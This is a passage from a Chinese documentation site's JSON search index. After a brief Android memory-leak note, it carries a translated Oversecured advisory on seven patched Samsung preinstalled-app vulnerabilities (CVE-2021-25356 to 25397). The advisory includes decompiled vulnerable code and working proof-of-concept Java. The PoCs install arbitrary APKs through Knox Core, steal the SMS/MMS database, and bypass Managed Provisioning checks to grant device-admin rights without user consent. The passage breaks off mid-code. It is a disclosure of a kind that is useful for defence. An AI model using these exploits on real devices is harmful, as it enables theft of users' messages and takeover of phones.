\u8fd9\u79cdContext\u62e5\u6709\u548c\u5e94\u7528\u7a0b\u5e8f\u4e00\u6837\u957f\u7684\u751f\u547d\u5468\u671f\uff0c\u5e76\u4e14\u4e0d\u4f9d\u8d56Activity\u7684\u751f\u547d\u5468\u671f\u3002\u5982\u679c\u4f60\u6253\u7b97\u4fdd\u5b58\u4e00\u4e2a\u957f\u65f6\u95f4\u7684\u5bf9\u8c61\uff0c \u00a0\u00a0\u00a0 \u5e76\u4e14\u5176\u9700\u8981\u4e00\u4e2a Context\uff0c\u8bb0\u5f97\u4f7f\u7528Application\u5bf9\u8c61\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7\u8c03\u7528Context.getApplicationContext()\u6216 Activity.getApplication()\u8f7b\u677e\u5f97\u5230Application\u5bf9\u8c61\u3002 \u00a0\u00a0\u00a0 \u6700\u8fd1\u9047\u5230\u4e00\u79cd\u60c5\u51b5\u5f15\u8d77\u4e86Context\u6cc4\u6f0f\uff0c\u5c31\u662f\u5728Activity\u9500\u6bc1\u65f6\uff0c\u91cc\u9762\u6709\u5176\u4ed6\u7ebf\u7a0b\u6ca1\u6709\u505c\u3002 \u00a0\u00a0\u00a0 \u603b\u7ed3\u4e00\u4e0b\u907f\u514dContext\u6cc4\u6f0f\u5e94\u8be5\u6ce8\u610f\u7684\u95ee\u9898\uff1a \u00a0\u00a0\u00a0 1.\u4f7f\u7528Application\u8fd9\u79cdContext\u7c7b\u578b\u3002 \u00a0\u00a0\u00a0 2.\u6ce8\u610f\u5bf9Context\u7684\u5f15\u7528\u4e0d\u8981\u8d85\u8fc7\u5b83\u672c\u8eab\u7684\u751f\u547d\u5468\u671f\u3002 \u00a0\u00a0\u00a0 3.\u614e\u91cd\u7684\u4f7f\u7528\u201cstatic\u201d\u5173\u952e\u5b57\u3002 \u00a0\u00a0\u00a0 4.Context\u91cc\u5982\u679c\u6709\u7ebf\u7a0b\uff0c\u4e00\u5b9a\u8981\u5728onDestroy()\u91cc\u53ca\u65f6\u505c\u6389\u3002  </p>"},{"location":"App/android%E5%86%85%E5%AD%98%E6%B3%84%E9%9C%B2%E4%BC%98%E5%8C%96%E6%80%BB%E7%BB%93/#7static","title":"7.static\u5173\u952e\u5b57","text":"<p>\u5f53\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u58f0\u660e\u6210static\u540e\uff0c\u5b83\u662f\u5c5e\u4e8e\u7c7b\u7684\u800c\u4e0d\u662f\u5c5e\u4e8e\u5bf9\u8c61\u7684\uff0c\u5982\u679c\u6211\u4eec\u5c06\u5f88\u5927\u7684\u8d44\u6e90\u5bf9\u8c61\uff08Bitmap\uff0ccontext\u7b49\uff09\u58f0\u660e\u6210static\uff0c\u90a3\u4e48\u8fd9\u4e9b\u8d44\u6e90\u4e0d\u4f1a\u968f\u7740\u5bf9\u8c61\u7684\u56de\u6536\u800c\u56de\u6536\uff0c \u00a0\u00a0\u00a0 \u4f1a\u4e00\u76f4\u5b58\u5728\uff0c\u6240\u4ee5\u5728\u4f7f\u7528static\u5173\u952e\u5b57\u5b9a\u4e49\u6210\u5458\u53d8\u91cf\u7684\u65f6\u5019\u8981\u614e\u91cd\u3002</p>"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/","title":"\u9ed1\u5ba2\u53ef\u4ee5\u5229\u7528\u4e09\u661f\u9884\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6765\u76d1\u89c6\u7528\u6237","text":""},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_1","title":"\u9ed1\u5ba2\u53ef\u4ee5\u5229\u7528\u4e09\u661f\u9884\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6765\u76d1\u89c6\u7528\u6237","text":"<p>\u4e09\u661f\u9884\u88c5\u7684 Android \u5e94\u7528\u7a0b\u5e8f\u4e2d\u62ab\u9732\u4e86\u591a\u4e2a\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u5982\u679c\u6210\u529f\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u672a\u7ecf\u7528\u6237\u540c\u610f\u7684\u60c5\u51b5\u4e0b\u8bbf\u95ee\u4e2a\u4eba\u6570\u636e\u5e76\u63a7\u5236\u8bbe\u5907\u3002</p> <p>\u201c\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u5f71\u54cd\u53ef\u80fd\u5141\u8bb8\u653b\u51fb\u8005\u8bbf\u95ee\u548c\u7f16\u8f91\u53d7\u5bb3\u8005\u7684\u8054\u7cfb\u4eba\u3001\u7535\u8bdd\u3001\u77ed\u4fe1/\u5f69\u4fe1\uff0c\u5b89\u88c5\u5177\u6709\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u7684\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u4ee3\u8868\u7cfb\u7edf\u7528\u6237\u8bfb\u5199\u4efb\u610f\u6587\u4ef6\uff0c\u8fd9\u53ef\u80fd\u4f1a\u66f4\u6539\u8bbe\u5907\u7684\u8bbe\u7f6e\uff0c\u201d\u79fb\u52a8\u5b89\u5168\u521d\u521b\u516c\u53f8 Oversecured \u7684\u521b\u59cb\u4eba Sergey Toshin\u5728\u5468\u56db\u53d1\u5e03\u7684\u4e00\u4efd\u5206\u6790\u62a5\u544a\u4e2d\u8868\u793a\u3002</p> <p>Toshin \u4e8e 2021 \u5e74 2 \u6708\u5411\u4e09\u661f\u62a5\u544a\u4e86\u8fd9\u4e9b\u7f3a\u9677\uff0c\u968f\u540e\u5236\u9020\u5546\u53d1\u5e03\u4e86\u8865\u4e01\uff0c\u4f5c\u4e3a\u5176 4 \u6708\u548c 5 \u6708\u7684\u6708\u5ea6\u5b89\u5168\u66f4\u65b0\u7684\u4e00\u90e8\u5206\u3002</p>"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_2","title":"\u4e03\u4e2a\u6f0f\u6d1e\u5217\u8868\u5982\u4e0b:","text":"<ul> <li>CVE-2021-25356\u00a0\u2013 \u6258\u7ba1\u4f9b\u5e94\u4e2d\u7684\u7b2c\u4e09\u65b9\u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7</li> <li>CVE-2021-25388\u00a0\u2013 Knox Core \u4e2d\u7684\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u6f0f\u6d1e</li> <li>CVE-2021-25390\u00a0\u2013\u00a0PhotoTable \u4e2d\u7684\u610f\u56fe\u91cd\u5b9a\u5411</li> <li>CVE-2021-25391\u00a0\u2013 \u5b89\u5168\u6587\u4ef6\u5939\u4e2d\u7684\u610f\u56fe\u91cd\u5b9a\u5411</li> <li>CVE-2021-25392\u00a0\u2013 \u53ef\u4ee5\u8bbf\u95eeDeX \u7684\u901a\u77e5\u7b56\u7565\u6587\u4ef6</li> <li>CVE-2021-25393\u00a0\u2013 \u53ef\u4ee5\u4f5c\u4e3a\u7cfb\u7edf\u7528\u6237\u5bf9\u4efb\u610f\u6587\u4ef6\u8fdb\u884c\u8bfb/\u5199\u8bbf\u95ee\uff08\u5f71\u54cd\u8bbe\u7f6e\u5e94\u7528\u7a0b\u5e8f\uff09</li> <li>CVE-2021-25397\u00a0\u2013 TelephonyUI \u4e2d\u7684\u4efb\u610f\u6587\u4ef6\u5199\u5165</li> </ul> <p>\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u5f71\u54cd\u610f\u5473\u7740\u5b83\u4eec\u53ef\u80fd\u88ab\u5229\u7528\u6765\u5b89\u88c5\u4efb\u610f\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u3001\u6388\u4e88\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u4ee5\u5220\u9664\u5176\u4ed6\u5df2\u5b89\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6216\u7a83\u53d6\u654f\u611f\u6587\u4ef6\u3001\u4ee5\u7cfb\u7edf\u7528\u6237\u8eab\u4efd\u8bfb\u53d6\u6216\u5199\u5165\u4efb\u610f\u6587\u4ef6\uff0c\u751a\u81f3\u6267\u884c\u7279\u6743\u64cd\u4f5c\u3002</p> <p>\u5728\u6982\u5ff5\u9a8c\u8bc1 (PoC) \u6f14\u793a\u4e2d\uff0cOversecured \u786e\u5b9a\u53ef\u4ee5\u5229\u7528 PhotoTable \u548c Secure Folder \u4e2d\u7684\u610f\u56fe\u91cd\u5b9a\u5411\u7f3a\u9677\u6765\u52ab\u6301\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee SD \u5361\u548c\u8bfb\u53d6\u5b58\u50a8\u5728\u624b\u673a\u4e2d\u7684\u8054\u7cfb\u4eba\u7684\u6743\u9650\u3002\u540c\u6837\uff0c\u901a\u8fc7\u5229\u7528 CVE-2021-25397 \u548c CVE-2021-25392\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u7528\u6076\u610f\u5185\u5bb9\u8986\u76d6\u5b58\u50a8 SMS/MMS \u6d88\u606f\u7684\u6587\u4ef6\uff0c\u5e76\u4ece\u7528\u6237\u901a\u77e5\u4e2d\u7a83\u53d6\u6570\u636e\u3002</p> <p>\u5efa\u8bae\u4e09\u661f\u8bbe\u5907\u6240\u6709\u8005\u5e94\u7528\u8be5\u516c\u53f8\u7684\u6700\u65b0\u56fa\u4ef6\u66f4\u65b0\uff0c\u4ee5\u907f\u514d\u4efb\u4f55\u6f5c\u5728\u7684\u5b89\u5168\u98ce\u9669\u3002</p>"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_3","title":"\u6f0f\u6d1e\u8be6\u60c5","text":"<p>\u8fd9\u4e9b\u6f0f\u6d1e\u53ef\u80fd\u5bfc\u81f4\u8fdd\u53cd GDPR\uff0c\u6211\u4eec\u5f88\u9ad8\u5174\u80fd\u591f\u5e2e\u52a9\u4e09\u661f\u53ca\u65f6\u8bc6\u522b\u548c\u4fee\u590d\u8fd9\u4e9b\u6f0f\u6d1e\u3002</p> <p>\u5982\u679c\u60a8\u662f\u5f00\u53d1\u4eba\u5458\u6216\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\uff0c\u60a8\u53ef\u4ee5\u5c06 Oversecured \u96c6\u6210\u5230\u60a8\u7684 CI/CD \u4e2d\uff0c\u4ee5\u4e3b\u52a8\u4fdd\u62a4\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u514d\u53d7\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u4fb5\u5bb3\u3002CI/CD \u8fc7\u7a0b\u4e5f\u53ef\u4ee5\u4f7f\u7528\u63d2\u4ef6\u5b8c\u5168\u81ea\u52a8\u5316\u3002\u6211\u4eec\u7684\u89e3\u51b3\u65b9\u6848\u5c06\u6301\u7eed\u76d1\u63a7\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u5728\u68c0\u6d4b\u5230\u4efb\u4f55\u65b0\u6f0f\u6d1e\u65f6\u63d0\u9192\u60a8\u3002</p> <p>\u4eceQuick Start\u5f00\u59cb\u8bd5\u7528\uff0c\u5f00\u59cb\u4fdd\u62a4\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u8005\u60a8\u53ef\u4ee5\u5728\u6b64\u5904\u8054\u7cfb\u6211\u4eec\u4ee5\u4e86\u89e3\u66f4\u591a\u4fe1\u606f\u5e76\u83b7\u53d6\u6f14\u793a\u3002</p> <p>\u5982\u679c\u60a8\u662f\u4e00\u540d\u5b89\u5168\u7814\u7a76\u4eba\u5458\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 Oversecured \u7684\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u626b\u63cf\u5668\u626b\u63cf\u8fd9\u4e9b\u9519\u8bef\uff0c\u4ece\u800c\u81ea\u52a8\u6267\u884c\u9519\u8bef\u68c0\u6d4b\u8fc7\u7a0b\u3002\u60a8\u6240\u8981\u505a\u7684\u5c31\u662f\u6ce8\u518c\u5e76\u4e0a\u4f20\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u6587\u4ef6\u3002\u6211\u4eec\u7684\u626b\u63cf\u4eea\u5c06\u8d1f\u8d23\u5176\u4f59\u7684\u5de5\u4f5c\u3002</p>"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_4","title":"\u6f0f\u6d1e\u8be6\u60c5\u5217\u8868\uff1a","text":"CVE SVE \u53d7\u5f71\u54cd\u7684\u5e94\u7528 \u63cf\u8ff0 \u5956\u52b1\u91d1\u989d CVE-2021-25388 SVE-2021-20636 Knox Core (com.samsung.android.knox.containercore) \u5b89\u88c5\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u548c\u8bbe\u5907\u8303\u56f4\u5185\u7684\u4efb\u610f\u6587\u4ef6\u76d7\u7a83 1720 \u7f8e\u5143 CVE-2021-25356 SVE-2021-20733 \u6258\u7ba1\u914d\u7f6e (com.android.managedprovisioning) \u5b89\u88c5\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u5e76\u6388\u4e88\u4ed6\u4eec\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650 7000 \u7f8e\u5143 CVE-2021-25391 SVE-2021-20500 \u5b89\u5168\u6587\u4ef6\u5939 (com.samsung.knox.securefolder) \u8bbf\u95ee\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u5546 1050 \u7f8e\u5143 CVE-2021-25393 SVE-2021-20731 SecSettings (com.android.settings) \u83b7\u5f97\u5bf9\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u8005\u7684\u8bbf\u95ee\u6743\u9650\u5bfc\u81f4\u4ee5\u7cfb\u7edf\u7528\u6237\u8eab\u4efd\uff08UID 1000\uff09\u5bf9\u4efb\u610f\u6587\u4ef6\u8fdb\u884c\u8bfb/\u5199\u8bbf\u95ee 5460 \u7f8e\u5143 CVE-2021-25392 SVE-2021-20690 \u4e09\u661f DeX \u7cfb\u7edf UI (com.samsung.desktopsystemui) \u80fd\u591f\u7a83\u53d6\u901a\u77e5\u7b56\u7565\u914d\u7f6e 330 \u7f8e\u5143 CVE-2021-25397 SVE-2021-20716 TelephonyUI (com.samsung.android.app.telephonyui) \uff08\u8986\u76d6\uff09\u5c06\u4efb\u610f\u6587\u4ef6\u5199\u5165\u4e3a UID 1001 4850 \u7f8e\u5143 CVE-2021-25390 SVE-2021-20724 PhotoTable (com.android.dreams.phototable) \u610f\u56fe\u91cd\u5b9a\u5411\u5bfc\u81f4\u8bbf\u95ee\u4efb\u610f\u5185\u5bb9\u63d0\u4f9b\u8005 280 \u7f8e\u5143"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#knox-core","title":"Knox Core \u4e2d\u7684\u6f0f\u6d1e","text":"<p>\u9996\u5148\uff0c\u6211\u4eec\u626b\u63cf\u4e86 Knox Core \u5e94\u7528\u7a0b\u5e8f\uff0c\u53d1\u73b0\u4ece SD \u5361\u5b89\u88c5\u4e86\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff1a</p> <p> \u4e8b\u5b9e\u8bc1\u660e\uff0c\u6b64\u529f\u80fd\u662f\u901a\u8fc7\u5bfc\u51fa\u7684\u670d\u52a1\u6fc0\u6d3b\u7684<code>com.samsung.android.knox.containercore.provisioning.DualDARInitService</code>\uff1a</p> <pre><code>&lt;service android:name=\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\" android:exported=\"true\"&gt;\n   &lt;intent-filter&gt;\n       &lt;action android:name=\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"/&gt;\n   &lt;/intent-filter&gt;\n&lt;/service&gt;\n</code></pre> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7<code>dualdar-config-client-location</code>\u53c2\u6570\u4f20\u9012\u4efb\u610f URI\uff0c\u8be5\u53c2\u6570\u5c06\u88ab\u590d\u5236\u5230<code>/sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk</code>\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e16\u754c\u53ef\u8bfb\u7684\u4f4d\u7f6e\u3002</p> <p>\u4e4b\u540e\uff0c\u5c06\u542f\u52a8\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u8fc7\u7a0b\uff1a</p> <pre><code>private void proceedPrerequisiteForDualDARWithWPCOD(Intent intent) {\n   if (intent.getBooleanExtra(\"DUAL_DAR_IS_WPCOD\", false)) {\n       int intExtra = intent.getIntExtra(\"android.intent.extra.user_handle\", UserHandle.myUserId());\n       Bundle bundleExtra = intent.getBundleExtra(\"DUAL_DAR_PARAMS\");\n       String string = bundleExtra.getString(\"dualdar-config-client-package\", null);\n       if (!TextUtils.isEmpty(string)) {\n           DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"Start proceedPrerequisiteForDualDARWithWPCOD 3rd-party crypto\");\n           String string2 = bundleExtra.getString(\"dualdar-config-client-location\"); // attacker-controlled URI\n           DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"DualDARPolicy.KEY_CONFIG_CLIENT_LOCATION = \" + string2);\n           if (TextUtils.isEmpty(string2)) {\n               notifyMPError(5);\n           } else if (string2.startsWith(\"file://\")) {\n               String str = getExternalFilesDir(null) + \"/client_downloaded_knox_app.apk\";\n               try {\n                   // attacker-controlled file is copied to the public location\n                   ((SemRemoteContentManager) this.mContext.getSystemService(\"rcp\")).copyFile(intExtra, string2.replaceFirst(\"^file://\", \"\"), intExtra, str);\n                   installPackageTask(intent, string, str); // and then installed\n               } catch (RemoteException unused) {\n                   DDLog.m3e(\"KNOXCORE::DualDARInitService\", \"copyFile failed.\");\n                   notifyMPError(5);\n               }\n           } else if (string2.startsWith(\"https://\")) {\n               downloadPackageTask(intent, string, string2);\n           } else {\n               notifyMPError(5);\n           }\n       } else {\n           DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"Start proceedPrerequisiteForDualDARWithWPCOD native crypto\");\n           startRunnerTask(intent);\n       }\n   }\n}\n</code></pre>"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_5","title":"\u5b89\u88c5\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u7684\u6982\u5ff5\u8bc1\u660e","text":"<pre><code>protected void onCreate(Bundle savedInstanceState) {\n   super.onCreate(savedInstanceState);\n\n   try {\n       Bundle bundle = new Bundle();\n       bundle.putString(\"dualdar-config-client-package\", \"test.exampleapp\");\n       bundle.putString(\"dualdar-config-client-location\", Uri.fromFile(copyFile()).toString());\n\n       Intent i = new Intent(\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\");\n       i.setClassName(\"com.samsung.android.knox.containercore\", \"com.samsung.android.knox.containercore.provisioning.DualDARInitService\");\n       i.putExtra(\"DualDARServiceEventFlag\", 500);\n       i.putExtra(\"DUAL_DAR_IS_WPCOD\", true);\n       i.putExtra(\"DUAL_DAR_PARAMS\", bundle);\n       startService(i);\n   }\n   catch (Throwable th) {\n       throw new RuntimeException(th);\n   }\n}\n\nprivate File copyFile() throws Throwable {\n   File file = new File(getApplicationInfo().dataDir, \"app.apk\");\n\n   InputStream i = getAssets().open(\"app-release.apk\");\n   OutputStream o = new FileOutputStream(file);\n   IOUtils.copy(i, o);\n   i.close();\n   o.close();\n   return file;\n}\n\n</code></pre>"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#smsmms","title":"SMS/MMS \u6587\u4ef6\u76d7\u7a83\u7684\u6982\u5ff5\u8bc1\u660e","text":"<pre><code>protected void onCreate(Bundle savedInstanceState) {\n   super.onCreate(savedInstanceState);\n\n   startDump();\n\n   try {\n       File dbPath = new File(getPackageManager().getApplicationInfo(\"com.android.providers.telephony\", 0).dataDir, \"databases/mmssms.db\");\n\n       Bundle bundle = new Bundle();\n       bundle.putString(\"dualdar-config-client-package\", \"test.exampleapp\");\n       bundle.putString(\"dualdar-config-client-location\", Uri.fromFile(dbPath).toString());\n\n       Intent i = new Intent(\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\");\n       i.setClassName(\"com.samsung.android.knox.containercore\", \"com.samsung.android.knox.containercore.provisioning.DualDARInitService\");\n       i.putExtra(\"DualDARServiceEventFlag\", 500);\n       i.putExtra(\"DUAL_DAR_IS_WPCOD\", true);\n       i.putExtra(\"DUAL_DAR_PARAMS\", bundle);\n       new Thread(() -&gt; {\n           for(int j = 1; j &lt; 1000; j++) {\n               startService(i);\n               try {\n                   Thread.sleep(500);\n               } catch (Throwable th) {\n                   throw new RuntimeException(th);\n               }\n           }\n       }).start();\n   }\n   catch (Throwable th) {\n       throw new RuntimeException(th);\n   }\n}\n\nprivate void startDump() {\n   final String path = \"/sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk\";\n\n   ContentValues values = new ContentValues();\n   values.put(\"_data\", path);\n   Uri uri = getContentResolver().insert(MediaStore.Files.getContentUri(\"external\"), values);\n\n   new Thread(new Runnable() {\n       public void run() {\n           while (true) {\n               try {\n                   InputStream i = getContentResolver().openInputStream(uri);\n                   String data = IOUtils.toString(i);\n                   Log.d(\"evil\", data);\n                   i.close();\n               } catch (Throwable th) {\n               }\n           }\n       }\n   }).start();\n}\n</code></pre>"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#poc","title":"PoC \u7684\u5de5\u4f5c\u539f\u7406\u5982\u4e0b\uff1a","text":"<ol> <li>\u542f\u52a8\u670d\u52a1\u5c06\u6240\u9700\u6587\u4ef6\u590d\u5236\u5230\u516c\u5171\u4f4d\u7f6e\uff08\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a\u65e0\u6548\u7684APK\u6587\u4ef6\uff0c\u5b89\u88c5\u9519\u8bef\u540e\u4f1a\u7acb\u5373\u5220\u9664\uff09\uff0c</li> <li>\u7136\u540e\uff0c<code>client_downloaded_knox_app.apk</code>\u8bfb\u53d6\u6587\u4ef6\u3002</li> </ol> <p>\u6ce8\u610f\uff1a\u6211\u4eec\u4f7f\u7528<code>MediaStore.Files</code>\u662f\u56e0\u4e3a\u6700\u65b0\u7684 Android \u7248\u672c\u4e0d\u5141\u8bb8\u76f4\u63a5\u8bfb\u53d6\u5c5e\u4e8e\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u7684\u5916\u90e8\u5b58\u50a8\uff0c\u4f46\u8fd9\u53ef\u4ee5\u4f7f\u7528 Android Media Content Provider \u7ed5\u8fc7\u3002</p>"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_6","title":"\u6258\u7ba1\u4f9b\u5e94\u4e2d\u7684\u6f0f\u6d1e","text":"<p>Managed Provisioning \u662f\u6240\u6709\u4e09\u661f\u8bbe\u5907\u4e0a\u9884\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u7528\u4e8e\u4f01\u4e1a\u8bbe\u5907\u5b9a\u5236\u3002</p> <p>\u518d\u4e00\u6b21\uff0c\u5728\u6d4b\u8bd5 Managed Provisioning \u65f6\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u4ece\u516c\u5171\u76ee\u5f55\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u7684\u6f0f\u6d1e\uff1a</p> <p> \u6700\u521d\u7684\u5e94\u7528\u7a0b\u5e8f\u662f\u7531 AOSP \u5f00\u53d1\u7684\uff0c\u5b83\u6709\u5b89\u5168\u68c0\u67e5\u6765\u9a8c\u8bc1\u4efb\u4f55\u4ea4\u4e92\u7684\u6388\u6743\u3002\u4e09\u661f\u4fee\u6539\u4e86\u6258\u7ba1\u914d\u7f6e\u5e94\u7528\u7a0b\u5e8f\uff0c\u4ee5\u6dfb\u52a0\u4e0e\u5176\u751f\u6001\u7cfb\u7edf\u548c Knox Core \u4ea4\u4e92\u6240\u9700\u7684\u529f\u80fd\u3002</p> <p>\u56e0\u6b64\uff0c\u5728\u4e09\u661f\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u503c\u6765\u7ed5\u8fc7\u6b64\u68c0\u67e5<code>com.samsung.knox.container.requestId</code>\uff1a</p> <pre><code>int intExtra = intent.getIntExtra(\"com.samsung.knox.container.requestId\", -1);\nif (intExtra &gt; 0) {\n   ProvisionLogger.logw(\"Skipping verifyActionAndCaller\"); // the bypass\n} else if (!verifyActionAndCaller(intent, str)) {\n   return;\n}\n</code></pre>"},{"location":"Poc/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/#_7","title":"\u7528\u4e8e\u5b89\u88c5\u81ea\u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f\u5e76\u4e3a\u5176\u6388\u4e88\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u7684\u6982\u5ff5\u8bc1\u660e","text":"<p>\u8fd9\u4e2a\u6982\u5ff5\u8bc1\u660e\u662f\u901a\u8fc7\u590d\u5236<code>ProvisioningParams.Builder</code>\u7c7b\u7684\u4ee3\u7801\u5e76\u4f20\u9012\u914d\u7f6e\u6258\u7ba1\u4f9b\u5e94\u6240\u9700\u7684\u6807\u51c6\u53c2\u6570\u6765\u6784\u5efa\u7684\uff0c\u5176\u4e2d\u5305\u62ec\uff1a</p> <ul> <li>\u4e0b\u8f7d\u5e94\u7528\u7a0b\u5e8f\u7684 URL</li> <li>\u6587\u4ef6\u7684 SHA1 \u54c8\u5e0c\u503c</li> <li>\u5728\u8bbe\u5907\u7ba1\u7406\u63a5\u6536\u673a\u7ec4\u4ef6\u540d\u79f0</li> </ul> <pre><code>byte[] hash = Base64.decode(\"5VNuCGDQygiVg4S86BKhySBVJlOpDZs3YYYsJKIOtCQ\", 0);\nPackageDownloadInfo.Builder infoBuiler = PackageDownloadInfo.Builder.builder()\n       .setLocation(\"https://redacted.s3.amazonaws.com/app-release.apk\")\n       .setPackageChecksum(hash)\n       .setSignatureChecksum(hash);\n\nProvisioningParams.Builder builder = ProvisioningParams.Builder.builder()\n       .setSkipUserConsent(true)\n       .setDeviceAdminComponentName(new ComponentName(\"test.exampleapp\", \"test.exampleapp.MyReceiver\"))\n       .setDeviceAdminPackageName(\"test.exampleapp\")\n       .setProvisioningAction(\"android.app.action.PROVISION_MANAGED_DEVICE\")\n       .setDeviceAdminDownloadInfo(infoBuiler.build());\n\nProvisioningParams params = builder.build();\n\nIntent i = new Intent(\"com.android.managedprovisioning.action.RESUME_PROVISIONING\");\ni.setClassName(\"com.android.managedprovisioning\", 